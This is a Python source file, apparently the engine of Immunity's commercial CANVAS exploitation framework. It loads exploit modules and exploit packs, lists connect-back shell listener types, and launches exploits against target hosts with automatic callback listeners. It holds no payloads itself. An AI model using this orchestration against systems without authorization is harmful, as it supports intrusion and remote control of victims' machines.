#! /usr/bin/env python
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""
canvasengine.py

CANVAS's Engine
"""
from datetime import datetime
#Change this to enable Project BALLOON features
BALLOON=0

import os, sys
#this is a quick check to see if they are running the exploit from the wrong directory
if "." not in sys.path: sys.path.append(".")
import time
import shutil
from internal import *
# activate debugging if --debug in argv (for customers)
_debug_opt = "--debug"
_debug_file = "debug.log"
if _debug_opt in sys.argv:
    sys.stderr = file(_debug_file, 'ab')
    sys.stderr.write("\n\n-----[ NEW DEBUG SESSION ]-----\n\n\n")
    add_debug_level('all')
    # cleaning argv in case
    while _debug_opt in sys.argv:
        sys.argv.remove(_debug_opt)


# provide a pack/unpack that is 64 bit compatible in the built in namespace
# replace all struct.pack/struct.unpack with CANVASPack/CANVASUnpack
# for 64 bit .. probably want to make this a True/False toggle

#import __builtin__
#from engine.fWrap import fWrap
#import struct
#
#def amdsixquatroFunc(a, k):
#    print "ALTERING: Args, Kwargs: ", a, k
#    aList = list(a) # unfreeze the tuple to list
#    sList = []
#    for c in a[0]:
#        if c == 'L': c = 'I'
#        if c == 'l': c = 'i'
#        sList.append(c)
#    aList[0] = "".join(sList)
#    a = tuple(aList) # freeze the list to tuple
#    print "ALTERED?: Args, Kwargs: ", a, k
#    return a, k
#
#__builtin__.__dict__['CANVASPack'] = fWrap(struct.pack, alterFunc = amdsixquatroFunc)
#__builtin__.__dict__['CANVASUnpack'] = fWrap(struct.unpack, alterFunc = amdsixquatroFunc)

# end of CANVASPack code

from engine import CanvasConfig
from engine.config import canvas_root_directory
from engine.config import canvas_resources_directory
from engine.config import canvas_reports_directory
from libs.daveutil import dmkdir
dmkdir(canvas_reports_directory)
from engine.http_mosdef import http_mosdef

#for Unixshell Nodes
from libs.ctelnetlib import Telnet
from shelllistener import shelllistener
from shelllistener import shellfromtelnet

from libs import paramiko as paramiko
# new listener handling
import hostKnowledge
from hostKnowledge import hostKnowledge

import socket
from exploitutils import *

#import Threading
from threading import RLock, Thread

# mutexing
import mutex

from exploitmanager import exploitmanager
import ConfigParser
sys.path = uniqlist(sys.path)

import libs.versioncheck as versioncheck
import libs.canvasos as canvasos

if CanvasConfig['sound']:
    import sounds.sound as sound

if CanvasConfig['sniffer']:
    try:
        import sniffer
        from localsniffer import localsniffer
    except:
        print "No sniffer - CRI version?"
    
from localNode import localNode
#    from SQLNode import SQLNode

# new style shellservers support ..
from MOSDEFShellServer import MosdefShellServer

VERSION="5.0" #GUI Version, not CANVAS version
DEFAULTCOLOR="black"

# ???
PHPMULTI = "PHP MULTI OS"
UNIXSHELL = "UNIXSHELL"

# making a push to sanitize and clean our naming conventions ..
FREEBSDMOSDEF_INTEL = "FREEBSD MOSDEF INTEL"
WIN32MOSDEF_INTEL   = "WIN32 MOSDEF INTEL"
OSXMOSDEF_PPC       = "OSX MOSDEF PPC"
OSXMOSDEF_INTEL     = "OSX MOSDEF INTEL"
AIXMOSDEF_51_PPC    = "AIX 5.1 MOSDEF PPC"
AIXMOSDEF_52_PPC    = "AIX 5.2 MOSDEF PPC"
SOLARISMOSDEF_INTEL = "SOLARIS MOSDEF INTEL"
SOLARISMOSDEF_SPARC = "SOLARIS MOSDEF SPARC"
LINUXMOSDEF_INTEL   = "LINUX MOSDEF INTEL"
LINUXEXECVE_INTEL   = "LINUX EXECVE INTEL"
HTTPMOSDEF          = "HTTP MOSDEF PLAINTEXT"
HTTPMOSDEF_SSL      = "HTTP MOSDEF SSL"
JAVASERVER          = "JAVA MOSDEF"

# backwards compatibility with old listener types ..
SOLARISSPARCMOSDEF = SOLARISMOSDEF_SPARC # backwards compatibility
LINUXMOSDEF = LINUXMOSDEF_INTEL # all the old sploits using this will be using intel
HTTPSMOSDEF = HTTPMOSDEF_SSL
WIN32MOSDEF = WIN32MOSDEF_INTEL

#used by ms03026.py. Fd's placed in this list will not be closed when
#the exploit is done
global socket_save_list
socket_save_list=[]

global canvaslanguage
canvaslanguage="EN" #english by default

    

# TODO use Fortune() from exploitutils
try:
    fortunes=open("misfortunes.txt").readlines()
except:
    try:
        fortunes=open("fortunes.txt").readlines()
    except:
        fortunes=["",""]
import random
random.shuffle(fortunes)
currentfortune=0

from libs.smartlist import smartlist, load_smartlist

def capme(astr):
    """
    ABDC -> Abcd
    """
    if not astr:
        return ""
    if len(astr)==1:
        return astr.upper()
    ret=astr[0].upper()+astr[1:].lower()
    return ret

def csvit(anobject):
    """
    converts an object to a string and removes commas (which mess up our comma seperated values format)
    """
    anobject=str(anobject).replace(",","-")
    return anobject

def html_docs_from_module(module):
    """
    Returns a sort of HTML documentation string from a canvas module
    You'll want to see gui/text_with_markup.py for rendering
    
    TODO: order all documentations the same way instead of randomly based on the hash table's whims
    
    TODO: support links and images in documentation
    """

    # sometimes this blows up on instance methods ..
    try:
        if not hasattr(module, "DOCUMENTATION"):
            module.DOCUMENTATION = {}
    except:
        return "",""
 
    docdic = module.DOCUMENTATION
    showdoc = "\n<module>\n"
    
    name = module.NAME.upper() # Reverted since we're not splitting
    
    # Alexm: Added for Customer request, behold the total lack of regular expressions!
    if module.DOCUMENTATION.has_key("CVE Name") and module.DOCUMENTATION["CVE Name"] != None:
        docslite = name + " - " + module.DOCUMENTATION["CVE Name"] + " - "
        # There's not a standard CVE URL vs. CVE Url, so I figured it better to be safe
        if module.DOCUMENTATION.has_key("CVE Url") and module.DOCUMENTATION["CVE Url"] != None:
            docslite += module.DOCUMENTATION["CVE Url"] + "\n"
        else:
            docslite += module.DOCUMENTATION.get("CVE URL", "*Unknown*") + "\n"
    else:
        docslite = None
    
    csvdoc = [csvit(name)] #comma seperated value for spreadsheets

    # TITLE setting
    # XXX: header too strong imo
    showdoc += "<b>%s</b><br/>\n"%xmlencode(name)
    if module.DESCRIPTION and module.DESCRIPTION.upper() != module.NAME.upper():
        showdoc += "%s"%xmlencode(module.DESCRIPTION)
        showdoc += "<br/><br/>\n"
    else: 
        showdoc += "<br/>\n"

    csvdoc += [csvit(module.DESCRIPTION)] #TODO ADD ENCODING

    # PROPERTY parsing
    if hasattr(module, "PROPERTY"):
        #handle properties dictionary
        for key in module.PROPERTY:
            if module.PROPERTY[key]: # XXX: don't do null strings or lists
                showdoc += "<b>%s: </b>%s<br/>\n"%(xmlencode(key.upper()),xmlencode(module.PROPERTY[key]))
                csvdoc += [csvit(key)+":"+csvit(module.PROPERTY[key])] #TODO ADD ENCODING
        cKeys = module.PROPERTY.keys()
    else:
        cKeys = []

    # DOCUMENTATION parsin
    for ea in docdic.keys():
        # XXX: if key is already handled by PROPERTY dict, don't show it here
        # sometimes MSADV is shown double
        if ea in cKeys:
            pass
        elif docdic[ea]: # XXX: do not show empty strings
            showdoc += "<b>%s: </b>%s<br/>\n"%(xmlencode(ea.upper()),xmlencode(docdic.get(ea)))
            csvdoc += [csvit(ea)+":"+csvit(docdic.get(ea))] #TODO ADD ENCODING
    showdoc += "<br/>\n" #newline to separate our documentation from our other data
    if not hasattr(module, "theexploit"):
        print "Module does not have a theexploit method"
        return 
    sploit = module.theexploit()

    try:
        connectbackdata = sploit.neededListenerTypes()
    except:
        connectbackdata = []
    if connectbackdata != []:
        showdoc+="<b>Connectback type: </b>%s<br/>\n"%(connectbackdata)
            
    
    if sploit.listenerArgsDict.get("fromcreatethread", 0):
        #some modules, like ifids, have fromcreatethread set, but are
        #not connectbacks
        if not hasattr(sploit, "needsNoShellcode") or not sploit.needsNoShellcode:
            showdoc += "<b>Commandline usage: </b>" + xmlencode("Requires a fromcreatethread WIN32 MOSDEF listener") + "\n"
    showdoc+="</module>\n\n"
    # XXX: why is this returning a tuple ? (also edit gui code if you edit return type here)
    return showdoc, csvdoc, docslite

class CANVASENGINEException(Exception):
    pass

defaultmodules=["osdetect","addhost","gethostbyname","emailsender","startservice"]
#,"oraclegetinfo","oraclegetuser","oraclegetpwd"]
#defaultmodules+=["FELINE","enumservices","osdetect"]
defaultmodules+=["userenum"]
defaultmodules+=["shareenum"]

def interestingDirlist(dirlist, topdir = ".", wantdir = True):
    """
    remove uninteresting dirs/files
    i.e.: CVS .svn .vim.swp
    """
    retlist = []
    for dirname in dirlist:
        if dirname in ["CVS"] or dirname[0] == '.' or (wantdir and not os.path.isdir(topdir + os.path.sep + dirname)):
            devlog('interestingDirlist', "%s discarded" % dirname)
            continue
        retlist.append(dirname)
    return retlist

def checkAndSetPath(name):
    dirname = ""
    # not in root directory (e.g. VisualSploit)
    cwd = os.getcwd()
    if cwd.find("VisualSploit") != -1:
        dirname = ".." + os.path.sep + "exploits" + os.path.sep + name
        print "[!] dirname set to: %s"%dirname
        # set ../ relative paths for anything that has ../../
        # print sys.path
        for path in sys.path:
            if path.find("../../") != -1 or path.find("..\\..\\") != -1:
                # we have to be cross os.path.sep compatible, because we hardcode "../../" a lot
                # therefor we can't actually use os.path.sep effectively.
                print "[!] fixing path for VisualSploit: %s"%path
                path = path.replace("../../", ".." + os.path.sep) # doesn't change if not there
                path = path.replace("..\\..\\", ".." + os.path.sep) # doesn't change if not there
                if path not in sys.path:
                    sys.path.insert(0, path)               
    else:
        path = ""
        # This is a shortcut lookup table set by registerAll to make it easy for us
        for k,v in moduleDirectoryMap.iteritems():
            if name in v:
                path = k
                break
            
        dirname =  os.path.join(path, name)
    return dirname

#global list of all exploit modules...
__exploitmods_old = {}    # keep for compatibility *DEPRECATED*
__exploitmods = {} # new way

class CanvasModule:
    """
    1 instance for each module
    """
    
    def __init__(self, name, path, mod = None):
        self.name = name
        self.path = path
        self.mod = mod
        self.processModule()
    
    def __str__(self):
        loadedstr = ""
        if not self.mod:
            loadedstr = "un"
        return "<%sloaded CANVAS Module '%s'>" % (loadedstr, self.name)
    
    def load(self):
        if self.mod:
            return self.mod
        sys.path.insert(0, self.path)
        self.mod = __import__(name, globals(), locals(), [dirname])
        sys.path.remove(self.path)
        self.processModule()
        return self.mod
    
    def unload(self):
        del self.mod
        self.mod = None
    
    def reload(self):
        if not self.mod:
            return self.load()
        sys.path.insert(0, self.path)
        self.mod = reload(self.mod)
        sys.path.remove(self.path)
        self.processModule()
        return self.mod
    
    def processModule(self):
        """Here, we can perform set up for each module, such as processing/validating its PROPERTY dict. This
        used to be done in the gui tree populationg code, but obviously doesn't belong in there.
        """
        exploitmod = self.mod
        name = self.name
        
        if hasattr(exploitmod, "PROPERTY"):
            devlog("canvasengine", "Exploitmod %s has PROPERTY"%name)
            property = exploitmod.PROPERTY
        else:
            devlog("canvasengine","module %s does not support extended PROPERTY{} attributes!" % name)
            
            # old method
            if not hasattr(exploitmod, "affectsList"):
                print "\nAttribute error found! This usually means your path has a module"
                print "filename on it that is not a CANVAS module."
                print "maybe you forgot to write the PROPERTY{} dictionnary?"
                print "can not import exploits/%s/%s.py\n" % (name, name)
                raise AssertionError
            
            devlog('canvasengine', "%s.PROPERTY missing" % name)
            property = {'MISSING': True}
        
        # check properties
        property_ref = {
            'TYPE': "",
            'SITE': "",
            'ARCH': [],
            'OS': [],
            'PROC': [],
            '0DAY': False,
            'MSADV': "",
        }
        
        # normalize property's keys -> all in CAPS
        for key in property.keys():
            if not key.isupper():
                property[key.upper()] = property[key]
                del property[key]
        
        # check property's types once
        for key in property_ref.keys():
            if property.has_key(key):
                assert type(property[key]) is type(property_ref[key]), \
                    "\n\n%s.PROPERTY['%s'] is %s\n%s expected\n" % \
                    (name, key, type(property[key]), type(property_ref[key]))
            else:
                # set default
                property[key] = property_ref[key]
        
        # we want DOCUMENTATION{}
        if not hasattr(exploitmod, "DOCUMENTATION"):
            devlog('import_exploits', "%s.DOCUMENTATION missing" % name)
            exploitmod.DOCUMENTATION = {}
        
        # process MSADV
        if property['MSADV'] != "":
            property['MSADV'] = property['MSADV'].upper()
            if property['MSADV'][0:2] != "MS":
                property['MSADV'] = "MS%s" % property['MSADV']
            assert property['MSADV'][4] == "-", "MSADV has to be in the form \"MSxx-xxx\""
            # force DOCUMENTATION['MSADV']
            exploitmod.DOCUMENTATION['MSADV'] = property['MSADV']
        
        # some old code requires affectsList
        if not hasattr(exploitmod, "affectsList"):
            exploitmod.affectsList = ""
        
        # convert from affectsList to PROPERTY
        if property.has_key('MISSING'):
            if exploitmod.affectsList == []:
                property['TYPE'] = "Misc"
                pass
            
            if "Locals" in exploitmod.affectsList:
                property['TYPE'] = "Exploit"
                property['SITE'] = "Local"
            if "Unix" in exploitmod.affectsList:
                property['TYPE'] = "Exploit"
                property['Unix hack'] = True
                property['SITE'] = "Remote"
            if "Windows" in exploitmod.affectsList:
                property['TYPE'] = "Exploit"
                property['OS'] += ["Windows"]
                property['SITE'] = "Remote"
            if "Client Side" in exploitmod.affectsList:
                property['TYPE'] = "Exploit"
                property['SITE'] = "Clientside"
            
            for moduletype in ["Commands", "Recon", "Tools", "SQL Injection", "Web Exploits", "DoS"]:
                if moduletype in exploitmod.affectsList:
                    property['TYPE'] = moduletype
        
        # we would like PROPERTY['ARCH']
        elif not len(property['ARCH']):
            devlog('import_exploits', "%s.PROPERTY['ARCH'] missing" % name)
        
        # push update into module for now, so that canvasos.fromModule gets it
        # but before we butcher up Arch/Version/OS next :(
        exploitmod.PROPERTY = property            
        exploitmod.TARGET_CANVASOS_LIST = canvasos.fromModule(exploitmod)

        # :(
        #if len(exploitmod.TARGET_CANVASOS_LIST) == 0 and property['TYPE'] in ["Exploit", "Web Exploit"]:
        #    raise AssertionError("Module %s has no targets, according to canvasos.fromModule. ARCH: %s" % (name, property['ARCH']))
        
        # build ARCH from OS + PROC
        for OS in property['OS']:
            f = True
            # avoid duplicate ARCH / OS
            for aOS in property['ARCH']:
                #assert type(aOS) == type([])
                if aOS[0] == OS:
                    f = False
            if not f:
                continue
            aOS = [OS]
            if property.has_key('PROC'):
                for proc in property['PROC']:
                    aOS.append(proc)
            property['ARCH'].append(aOS)
        
        # TODO: clean that for()
        devlog('gui::fillmoduletree', "property[ARCH] = %s" % property['ARCH'])
        for arch in property['ARCH']:
            if len(arch) == 1:
                versions_list = ["All"]
            else:
                versions_list = arch[1:]
            # for Windows, expand Version list
            if arch[0] == "Windows": # caps?
                if property.has_key('VERSION'):
                    import string
                    property['VERSION'] = map(string.upper, property['VERSION'])
                    if "ALL" in property['VERSION']:
                        #arch.append("ALL")
                        arch = ["Windows", "All"]
                    else:
                        versions_list = property['VERSION']
                    del property['VERSION']
                else:
                    #arch.append("ALL")
                    arch = ["Windows", "All"]
                if arch == ["Windows", "All"]: #len(arch) == 2 and arch[1].upper() == "ALL":
                    del arch[1]
                    versions_list = ["NT", "2000", "XP", "2003", "Vista"]
            arch += versions_list
        devlog('gui::fillmoduletree', "property[ARCH] = %s" % property['ARCH'])
        
        if not property['0DAY'] and "0DAY" in exploitmod.DESCRIPTION.upper():
            devlog('import_exploits', "0DAY in description, but %s.PROPERTY['0DAY']=True not set" % name)
            property['0DAY'] = True
        
        if property['0DAY'] and exploitmod.DESCRIPTION[0:6] != "[0day]":
            devlog('import_exploits', "%s.PROPERTY['0DAY']=True but not '[0day]' in description" % name)
            exploitmod.DESCRIPTION = "[0day] " + exploitmod.DESCRIPTION
        
        # </transition>
                
        # common to 0days
        if property['0DAY']:
            # some exploits files are copy/paste from public bug
            # and have some wrong "release date"
            # here we reset that to be more coherent.
            if exploitmod.DOCUMENTATION.has_key("Date public") and \
                exploitmod.DOCUMENTATION["Date public"] not in \
                ["Not public/0day", "Not Public / 0day", "Not Public/0day"]:
                devlog('import_exploits', "%s.PROPERTY['0DAY']=True but 'Date public' is %s" % \
                    (name, exploitmod.DOCUMENTATION["Date public"]))
            exploitmod.DOCUMENTATION["Date public"] = "Not public/0day"
        
        ep = None
        for x in exploitPacks.itervalues():
            if self.name in x.modules:
                ep = x
                break
            
        if ep:
            exploitmod.exploitPack = ep

        # Make sure changes are propagated back into the module.
        exploitmod.PROPERTY = property            

        
class __RegisterModulesLog:
    
    def __init__(self):
        self.modnum = 0
        self.curidx = 0
    
    def run(self, func):
        func()
 
    def setcuridx(self, idx):
        self.curidx=idx
        
    def setmax(self, maxnum):
        self.modnum = maxnum
    
    def log(self, name):
        writeflush("Loading %s ...%s" % (name, ' ' * (80 - 19 - len(name))))
    
    def setstatus(self, name, succeeded = True):
        out = {True: " ok ", False: "fail"}
        writeflush("[" + out[succeeded] + "]\n")
        self.curidx += 1
    
    def succeeded(self, name):
        self.setstatus(name)
    
    def failed(self, name):
        self.setstatus(name, False)

registermoduleslog = __RegisterModulesLog()

class __CanvasModules:
    """
    1 instance that hold all modules
    """
    
    def __init__(self):
        pass

# This stores a map of module names and the directory we are to load it from
# keys are directory names, value is a list of exploits from that directory
moduleDirectoryMap = {}

EXPLOITPACK_LICENSE_FLAG=".exploitPackLicenseSeen"

class ExploitPackError(Exception):
    pass

class ExploitPack:
    """One of these is instantiated for each third party exploit pack"""
    
    def __init__(self, path):
        self.path = path
        self.exploitdirs = []
        self.exploitSections = {}
        self.modules = []
        self.loadInfo(path)
        self.setup()
    
    def setup(self):
        for p in self.libdirsWalked:
            if p not in sys.path:
                sys.path.append(p)
    
    def unsetup(self):
        for p in self.libdirsWalked:
            if p in sys.path:
                sys.path.remove(p)
    def isDemo(self):
        return self.demo == "Yes"
    
    def loadInfo(self, path):
        configPath = os.path.join(path, "package.info")
        if os.path.exists(configPath):
            cp = ConfigParser.SafeConfigParser()
            cp.read(configPath)
            for k in ["name", "longName", "author", "version", "libdirs", "demo", "readme", "contactUrl", "contactEmail", "contactPhone", "license"]:
                setattr(self, k, cp.get("main", k))
            
            self.license = os.path.join(path, self.license)
            if not os.path.exists(self.license):
                raise ExploitPackError("Exploit pack License file %s missing" % self.license)
            
            self.readme = os.path.join(path, self.readme)
            if not os.path.exists(self.readme):
                raise ExploitPackError("Exploit pack Readme file %s missing" % self.readme)
            
            if self.demo not in ["Yes", "No"]:
                raise ExploitPackError("Third party exploit pack demo value %s is not one of 'Yes' or 'No'")
            
            libdirs = []
            def addDir(arg, dirname, names):
                libdirs.append(dirname)
                        
            for i in self.libdirs.split(","):
                os.path.walk(os.path.join(self.path, i), addDir, None)
            
            self.libdirsWalked = libdirs            
            
            print "Initializing exploit pack: %s" % self.longName
            for section in cp.sections():
                if section == "main":
                    continue
                x = os.path.join(path, section)
                if os.path.exists(x):
                    self.exploitdirs.append(x)                    
                    devlog("canvasengine: Added exploit pack exploit path: %s" % x)
                else:
                    raise ExploitPackError("Exploits directory %s specified in exploit pack %s missing" % (x, self.name))
                    
            for d in self.exploitdirs:
                self.modules += processModuleDir(d)
            
        else:
            raise ExploitPackError("No package.info file in exploit pack directory %s" % path)

# Stores a name:exploitPack instances dict
exploitPacks = {}
loadedExploitPaths = None

def loadExploitPaths():
    """Single place to handle paths to exploit collections"""
    # This might be called multiple times, so it must be safe to do so. 
    
    global exploitPacks
    global loadedExploitPaths
    
    if loadedExploitPaths != None:
        return loadedExploitPaths
    
    exploitdirslist=["exploits"]
    for d in exploitdirslist:
        processModuleDir(d)
    
    exploitpacks = CanvasConfig.get("exploit_pack_dirs", "").split(",")
    if "EXPLOITPACKS" in os.environ:
        for d in os.environ["EXPLOITPACKS"].split(","):
            exploitpacks.append(d)

    for epd in exploitpacks:
        if os.path.exists(epd):
            for i in os.listdir(epd):
                if i == ".svn":
                    continue
                p = os.path.join(epd, i)
                if os.path.isdir(p):
                    try:
                        ep = ExploitPack(p)
                        if ep.name not in exploitPacks.keys():
                            exploitPacks[ep.name] = ep
                        else:
                            # If we have both the demo and the full versions of the same pack, we discard the demo one
                            # in favour of the full-flavoured version.
                            if ep.demo == "No" and exploitPacks[ep.name].demo == "Yes":
                                exploitPacks[ep.name].unsetup()
                                exploitPacks[ep.name] = ep
                                                
                        exploitdirslist += ep.exploitdirs                    
                    except ExploitPackError, i:
                        registermoduleslog.log("Error loading exploit pack from %s: %s" % (p, i))                
                        
    
    if "MOREEXPLOITS" in os.environ:
        newpath=os.environ["MOREEXPLOITS"]
        devlog("canvasengine","Loading more exploits from %s"%newpath)
        exploitdirslist.append(newpath)
        processModuleDir(newpath)
        
    loadedExploitPaths = exploitdirslist
    return exploitdirslist

def processModuleDir(mydir):
    global moduleDirectoryMap
    
    exploitsNames=os.listdir(mydir)
    exploitsNames = interestingDirlist(exploitsNames, mydir)
    exploitsNames.sort()
    
    moduleDirectoryMap[mydir] = exploitsNames
    
    return exploitsNames

def exploitmodsGet(extmode = False):
    global __exploitmods_old
    global __exploitmods
    if extmode:
        return __exploitmods
    return __exploitmods_old

def registeredModuleList(extmode = False, functype = 'keys'):
    modulelist = getattr(exploitmodsGet(extmode), functype)()
    modulelist.sort()
    return modulelist

def registerModule(name):
    """
    imports and adds a exploit module to our list, returns 1 on success"
    """
    assert not '-' in name, "can't import modules with '-' in name (tried to import %s)" % name
    global __exploitmods_old
    if __exploitmods_old.has_key(name):
        devlog('registerModule', "return module from cache: %s" % __exploitmods_old[name])
        return __exploitmods_old[name]
    if registermoduleslog:
        #set registermoduleslog to None if you don't want to do this
        registermoduleslog.log(name)

    loadExploitPaths()
    dirname = checkAndSetPath(name)

    rname=name

    sys.path.insert(0, dirname)
    # XXX TODO clean VSP code here.
    try:            
        exploitmod = __import__(rname, globals(), locals(), [dirname])
    except:
        # first module import on VisualSploit will fail because sys.path was not fixed yet
        cwd = os.getcwd()
        if cwd.find("VisualSploit") != -1:
            print "[!] ignoring initial exception due to VisualSploit path fix ..."
            dirname = checkAndSetPath(name)
            try:
                exploitmod = __import__(rname, globals(), locals(), [dirname])
            except:
                if debug_enabled:
                    import traceback
                    traceback.print_exc(file=sys.stdout)
                    devlog('all', "Was unable to import %s" % name)
                exploitmod = None #failure
        else:
            if debug_enabled:
                import traceback
                traceback.print_exc(file=sys.stdout)
                # XXX shouldn't be a print here? to tell the user smth is wrong.
                devlog('all', "Was unable to import %s" % name)
            exploitmod = None #failure

    sys.path.remove(dirname)
    
    if exploitmod:
        #for the case where someone stuffs an __init__.py like so exploits/addhost/__init__.py
        #temporarilly commented out
        #try:
        #    exploitmod=__import__(name+"."+name, globals(), locals(), [dirname])
        #except:
        #    pass
        __exploitmods_old[name] = exploitmod
        __exploitmods[name] = CanvasModule(name, dirname, exploitmod)
        registermoduleslog.succeeded(name)
    # XXX 2 next lines necessary?
    else:
        devlog('registerModule', "exploitmod[%s] == None?" % name)
        registermoduleslog.failed(name)
        bugreport()
    return exploitmod #success

def count_registered_modules():
    return len(exploitmodsGet())

def unregisterModule(name):
    if __exploitmods.has_key(name):
        del __exploitmods[name]
    if __exploitmods_old.has_key(name):
        del __exploitmods_old[name]

def registerSomeModules(modulelist):
    """for exploits that need to register a few modules, but you don't
    want to register ALL the modules
    """
    map(registerModule, modulelist)

registeredallmodules=0

def registerAllModules():
    """
    
    Note that if you have the environment variable MOREEXPLOITS set, we can also load from another
    directory tree...
    
    """    
      
    exploitdirslist = loadExploitPaths()    
    registeredallmodules=1

    for mydir in exploitdirslist:       
        
        exploitsNames = processModuleDir(mydir)
        number_of_modules=len(exploitsNames)        
        
        #have to multiply by two because we do 2 pushes for each module (on success/fialure)
        registermoduleslog.setcuridx(count_registered_modules())
        registermoduleslog.setmax(number_of_modules*2)
        devlog("canvasengine","Exploit names loading %d modules"%len(exploitsNames))
        registerSomeModules(exploitsNames)
    
    return

class modulesInThread(Thread):
    """Used to load modules in one thread while gui displays status about that
    in another window"""
    def __init__(self):
        Thread.__init__(self)
        self.mylock=RLock()
        
    def run(self):
        self.mylock.acquire()
        devlog("Waiting for gui to come up before starting to register modules")
        time.sleep(3) #wait for gui to come up
        devlog( "Waited")
        registerAllModules()
        self.mylock.release()
        return
    
def registerAllModulesInThread():
    """
    Used to load the modules in one thread while the GUI updates in another
    """
    mit=modulesInThread()
    print "Starting loading modules in thread"
    mit.start() #start new thread
    time.sleep(1) #wait for Rlock to be acquired
    return mit

def reloadAllModules():
    for mod in registeredModuleList(extmode=True, functype = 'values'):
        devlog('all', "reloading %s" % mod, nodesc = True)
        mod.reload()

def unloadAllModules():
    for mod in registeredModuleList(extmode=True, functype = 'values'):
        del mod

def getModule(name, extmode = False):
    #print "[C] Getting module %s"%name
    exploitslist = exploitmodsGet(extmode)
    if not exploitslist.has_key(name):
        registerModule(name)
    if exploitslist.has_key(name):
        return exploitslist[name]
    # if we didn't add the new modules to the list before, smth is wrong :/
    print "Loaded modules: %s" % exploitslist.keys()
    raise CANVASENGINEException, "Module %s not found" % name

def getModules(names):
    """Get a list of modules from a list of names"""
    return map(getModule,names)

def getModuleExploitClass(name, which='theexploit'):
    # XXX not safe, could raise CANVASENGINEException
    return getattr(getModule(name), which)
    #return getModule(name).theexploit

def getModuleExploit(name):
    # XXX not safe, could raise CANVASENGINEException
    return getModule(name).theexploit()

def delModule(name):
    unregisterModule(name)

def getAllListenerOptions():
    """
    This function is mostly used to fill up the dialog box that pops up
    when you try to start a new MOSDEF listener manually
    """

    # listener types .. try to keep these organized by os and arch !
    return [WIN32MOSDEF_INTEL,
            SOLARISMOSDEF_SPARC,
            SOLARISMOSDEF_INTEL,
            LINUXMOSDEF_INTEL,
            LINUXEXECVE_INTEL, 
            FREEBSDMOSDEF_INTEL, 
            OSXMOSDEF_PPC, 
            OSXMOSDEF_INTEL,
            AIXMOSDEF_51_PPC,
            AIXMOSDEF_52_PPC,
            HTTPMOSDEF, 
            HTTPMOSDEF_SSL, 
            PHPMULTI,
            JAVASERVER,
            UNIXSHELL]

class runExploitClass(Thread):
    """
    Used just for starting up an exploit in its own thread, so the start up
    process itself doesn't freeze any potential gui. We set it
    as a Daemon thread.
    """
    def __init__(self,engine,module,argsDict):
        Thread.__init__(self)
        self.engine=engine
        self.module=module
        self.argsDict=argsDict
        self.setDaemon(1)
    
    def run(self):
        runExploit(self.engine,self.module,self.argsDict)
        
        
        

# XXX: daemonFlag added for better control of threading semantics
# XXX: daemonFlag controls setDeamon(True/False) in exploitmanager
# XXX: __init__ ... this is needed e.g. for SILICA engine inits
# XXX: the default is None, so it defaults to old behaviour and will
# XXX: remain to work without any daemonFlag arguments

# SILICA note:
# what was happening was that for alex, the only active thread 
# was a daemon thread, as per python threading specs, it will exit 
# the python program when there are no active non-deamon threads..so 
# we needed to be able to setDeamon True/False explicitly in 
# situations where the only active thread is the runexploit thread

def runExploit(engine, module, argsDict, daemonFlag=None, silicaGui=None):
    """
    GUI independent code that runs the exploit

    Because we start up a callback listener on demand if we cannot find one already 
    started, this routine may sometimes block. Hence, it should always be in
    its own thread (not the Main thread).
    
    Returns the Thread and the CANVASEXPLOIT object. If you want to halt the thread nicely
    call CANVASEXPLOIT.halt().
    On failure returns (0, None)
    So check for that.
    
    This function will return a LIST of (manager, exploit) objects
    if engine.target_hosts has more than one host in it
    """
    #print "Version is %d"%version
    #print "Method is %d"%method
    #print "runExploit()"
    ret=[]
    devlog("canvasengine", "Running exploit on %d hosts"%len(engine.target_hosts))
    for targethost in engine.target_hosts:

        #for each host, we run the exploit!
        app=module.theexploit()
        if(hasattr(targethost, "interface")):
            devlog("canvasengine", "Running exploit %s on host %s"%(app.name,targethost.interface))
        app.setId(engine.getNewListenerId())
        app.engine=engine
        app.gui=engine.gui
        if(silicaGui):
            app.gui = silicaGui
        app.argsDict = argsDict
        #need to set the method first since module.neededListener type requires it - SER
        #also move the setVersion higher up since in some of the sploits app.neededListenerTypes() checks for it
        app.setLogFunction(engine.exploitlog)
        app.setDebugFunction(engine.exploitdebuglog)

        app.setDataViewColumnsFunction(engine.DataViewColumns)
        app.setDataViewInfoFunction(engine.DataViewInfo)
            
        #print "Setting info"
        app.setInfo(app.getInfo())
        #print "Adding Listener"
        engine.addExploitLine(app)
        app.setCovertness(engine.getCovertness())
        #print "starting"
        #set the three main variables for the exploit
        app.argsDict["passednodes"]=engine.passednodes
        app.version=app.argsDict["version"]
        
        if targethost==None:
            print "Weird error in engine with target_host==None!"
            return False
        if hasattr(targethost,"interface")==False:
            devlog("canvasengine","runExploit: engine.target_host.interface==None?! %s"%str(targethost))
        app.target=targethost
        
        if app.version==0: # XXX is that code correct? if you know write an explanation here please.
            devlog('canvasengine', "Test version found ... starting")
            manager=exploitmanager(app, engine, daemonFlag)
            manager.start()
            ret+=[ (manager, app) ]
            continue
    
        devlog('canvasengine', "%s.neededListenerTypes=%s"%(app.name,app.neededListenerTypes()))
        #sys.stdout.flush()
        #this code is duplicated in exploitmanager, be careful
        neededlistenertypes=app.neededListenerTypes()
    
        # XXX we needed no-autofind control for httpserver (can't match target to callback there!)
        autoFind = True
        if hasattr(app, "autoFind"):
            autoFind = app.autoFind
        
        if neededlistenertypes!=[]:
            engine.log("Running autolistener for exploit that wants listener: %s"%repr(neededlistenertypes))
            devlog("canvasengine", "Doing autolistener from canvasengine::RunExploit")
            listener=engine.autoListener(neededlistenertypes[0], autoFind=autoFind)
            if listener==None: #still none? Then print error message        
                engine.log("You need to select a valid listener %s for this exploit!"%(app.neededListenerTypes()))
                return 0, None
            devlog('canvasengine', "Setting listener: %s, argsdict: %s" % (listener, app.listenerArgsDict))
            listener.argsDict=app.listenerArgsDict
            listener.current_exploit=app
        else:
            listener=None
        
    
        app.callback=listener #note: this is a listener, not an interface!
        devlog('canvasengine', "Set app.callback to %s"%app.callback)
        manager=exploitmanager(app, engine, daemonFlag)
        devlog('canvasengine', "calling manager.start()")
        manager.start()
        
        engine.log("Running exploit %s"%module.DESCRIPTION)
        ret+=[(manager, app)]
        
    if len(engine.target_hosts)==1:
        #one host selected, choosing compatability mode
        #we don't want to return a list in this case
        ret=ret[0]
    return ret



from threading import Thread

class threadListenerStarter(Thread):
    """
    When the engine recieves a new callback (typically from pyGTK's event loop)
    it spawns this threadListenerStarter to handle doing the actual initialization.
    
